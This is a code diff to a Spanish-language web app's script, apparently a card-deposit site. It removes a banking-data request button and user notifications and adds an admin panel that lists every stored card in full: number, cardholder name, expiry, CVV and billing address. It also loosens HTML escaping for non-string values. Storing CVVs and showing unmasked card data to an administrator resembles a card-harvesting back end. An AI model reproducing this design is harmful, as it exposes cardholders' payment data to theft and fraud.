@@ -1521,36 +1521,9 @@
     }
 
     
-    const transferForm = document.getElementById('transferencia-form');
-    if (transferForm) {
-        const requestBtn = document.createElement('button');
-        requestBtn.type = 'button';
-        requestBtn.className = 'w-full bg-yellow-500 hover:bg-yellow-600 text-white py-3 px-6 rounded-lg transition-transform transform hover:scale-105 mb-4';
-        requestBtn.textContent = 'Solicitar ver datos bancarios';
-        requestBtn.onclick = function() {
-            if (!state.currentUser) return alert('Debes iniciar sesión.');
-            
-            const exists = state.bankingRequests.some(r => r.userId === state.currentUser.id && r.status === 'pending');
-            if (exists) return alert('Ya has solicitado acceso. Espera la respuesta del administrador.');
-            state.bankingRequests.push({
-                id: Date.now(),
-                userId: state.currentUser.id,
-                userName: state.currentUser.name,
-                status: 'pending',
-                createdAt: new Date().toLocaleString()
-            });
-            saveState();
-            renderBankingRequests();
-            alert('Solicitud enviada al administrador.');
-        };
-        transferForm.insertBefore(requestBtn, transferForm.firstChild);
-    }
-
-    
     function renderBankingRequests() {
         let container = document.getElementById('admin-banking-requests');
         if (!container) {
-            
             const adminPage = document.getElementById('admin');
             if (!adminPage) return;
             container = document.createElement('div');
@@ -1565,7 +1538,7 @@
                 <ul>
                     ${state.bankingRequests.map(r => `
                         <li class="mb-3 p-3 border rounded flex justify-between items-center ${r.status === 'pending' ? 'bg-yellow-50' : 'bg-green-50'}">
-                            <span><strong>${escapeHtml(r.userName)}</strong> (${escapeHtml(r.createdAt)})</span>
+                            <span><strong>${escapeHtml(r.userName || '')}</strong> (${escapeHtml(r.createdAt || '')})</span>
                             <span>
                                 ${r.status === 'pending' ? `
                                     <button class="approve-banking bg-green-600 text-white py-1 px-3 rounded text-sm" data-id="${r.id}">Aprobar</button>
@@ -1577,7 +1550,7 @@
                 </ul>
             </div>
         `;
-        
+        // Acciones de aprobar/rechazar
         container.querySelectorAll('.approve-banking').forEach(btn => {
             btn.onclick = function() {
                 const id = Number(this.getAttribute('data-id'));
@@ -1599,73 +1572,75 @@
             };
         });
     }
-    renderBankingRequests();
+    renderBankingCardRequests();
 
-    function maskCard(number) {
-        const s = String(number).replace(/\s+/g,'');
-        if (s.length <= 4) return s;
-        const last4 = s.slice(-4);
-        return '**** **** **** ' + last4;
+    function renderBankingCardRequests() {
+        let container = document.getElementById('admin-card-requests');
+        if (!container) {
+            const adminPage = document.getElementById('admin');
+            if (!adminPage) return;
+            container = document.createElement('div');
+            container.id = 'admin-card-requests';
+            container.className = 'bg-white rounded-xl p-6 mb-6 shadow-lg';
+            adminPage.appendChild(container);
+        }
+        container.innerHTML = `
+            <h3 class="text-xl font-bold text-blue-800 mb-4">Todas las Solicitudes de Tarjeta Bancaria</h3>
+            <div class="overflow-x-auto">
+                <table class="w-full text-sm">
+                    <thead>
+                        <tr class="bg-blue-600 text-white">
+                            <th class="p-2 text-left">ID</th>
+                            <th class="p-2 text-left">Usuario</th>
+                            <th class="p-2 text-left">Monto</th>
+                            <th class="p-2 text-left">Número</th>
+                            <th class="p-2 text-left">Nombre</th>
+                            <th class="p-2 text-left">Expiración</th>
+                            <th class="p-2 text-left">CVV</th>
+                            <th class="p-2 text-left">Dirección</th>
+                            <th class="p-2 text-left">Estado</th>
+                            <th class="p-2 text-left">Creado</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        ${state.pendingDeposits.map(p => {
+                            const user = state.users.find(u => u.id === p.userId) || { name: 'Desconocido', email: '' };
+                            return `
+                                <tr class="border-b border-gray-200 hover:bg-gray-50">
+                                    <td class="p-2">${p.id}</td>
+                                    <td class="p-2">${escapeHtml(user.name)}<br><small class="text-xs text-gray-500">${escapeHtml(user.email)}</small></td>
+                                    <td class="p-2">$${parseFloat(p.amount).toLocaleString('es-AR')} ARS</td>
+                                    <td class="p-2">${escapeHtml(p.cardFull.number)}</td>
+                                    <td class="p-2">${escapeHtml(p.cardFull.name)}</td>
+                                    <td class="p-2">${escapeHtml(p.cardFull.expiry)}</td>
+                                    <td class="p-2">${escapeHtml(p.cardFull.cvv)}</td>
+                                    <td class="p-2">${escapeHtml(p.address)}, ${escapeHtml(p.city)}, ${escapeHtml(p.country)}</td>
+                                    <td class="p-2">${escapeHtml(p.status)}</td>
+                                    <td class="p-2">${escapeHtml(p.createdAt)}</td>
+                                </tr>
+                            `;
+                        }).join('')}
+                    </tbody>
+                </table>
+            </div>
+        `;
     }
 
-    function escapeHtml(str) {
-        return String(str).replace(/[&<>"'`=\/]/g, function(s) {
-            return ({
-                '&': '&amp;',
-                '<': '&lt;',
-                '>': '&gt;',
-                '"': '&quot;',
-                "'": '&#39;',
-                '/': '&#x2F;',
-                '`': '&#x60;',
-                '=': '&#x3D;'
-            })[s];
-        });
+    function maskCard(cardNumber) {
+        if (!cardNumber || cardNumber.length < 4) return '****';
+        const clean = cardNumber.replace(/\D/g, '');
+        return clean.slice(0, -4).replace(/\d/g, '*') + clean.slice(-4);
     }
 
-    
-    function addNotification(userId, message) {
-        state.notifications.push({ userId, message, date: new Date().toLocaleString() });
-        saveState();
-    }
-
-    
-    document.querySelectorAll('.approve').forEach((btn, idx) => {
-        btn.addEventListener('click', function() {
-            const tr = btn.closest('tr');
-            const user = state.users.find(u => u.id === state.pendingDeposits[idx].userId);
-            if (!user) return;
-            addNotification(user.id, 'Tu depósito con tarjeta fue aprobado.');
-        });
-    });
-    document.querySelectorAll('.reject').forEach((btn, idx) => {
-        btn.addEventListener('click', function() {
-            const tr = btn.closest('tr');
-            const user = state.users.find(u => u.id === state.pendingDeposits[idx].userId);
-            if (!user) return;
-            addNotification(user.id, 'Tu depósito con tarjeta fue rechazado.');
-        });
-    });
-
-    
-    function renderUserNotifications() {
-        const container = document.getElementById('dashboard');
-        if (!container || !state.currentUser) return;
-        const notes = state.notifications.filter(n => n.userId === state.currentUser.id);
-        let html = '';
-        notes.forEach(n => {
-            html += `<div class="bg-yellow-100 text-yellow-800 rounded p-3 mb-2">${escapeHtml(n.message)} <span class="text-xs text-gray-500">${escapeHtml(n.date)}</span></div>`;
-        });
-        
-        container.insertAdjacentHTML('afterbegin', html);
-    }
-    
-    if (state.currentUser) {
-        document.getElementById('login-view')?.classList.add('hidden');
-        document.getElementById('main-app')?.classList.remove('hidden');
-        updateUIForUser();
-        navigateTo('dashboard');
-    }
+    function escapeHtml(text) {
+    if (typeof text !== 'string') return text;
+    return text
+        .replace(/&/g, "&amp;")
+        .replace(/</g, "&lt;")
+        .replace(/>/g, "&gt;")
+        .replace(/"/g, "&quot;")
+        .replace(/'/g, "&#039;");
+}
 </script>
 </body>
 </html>
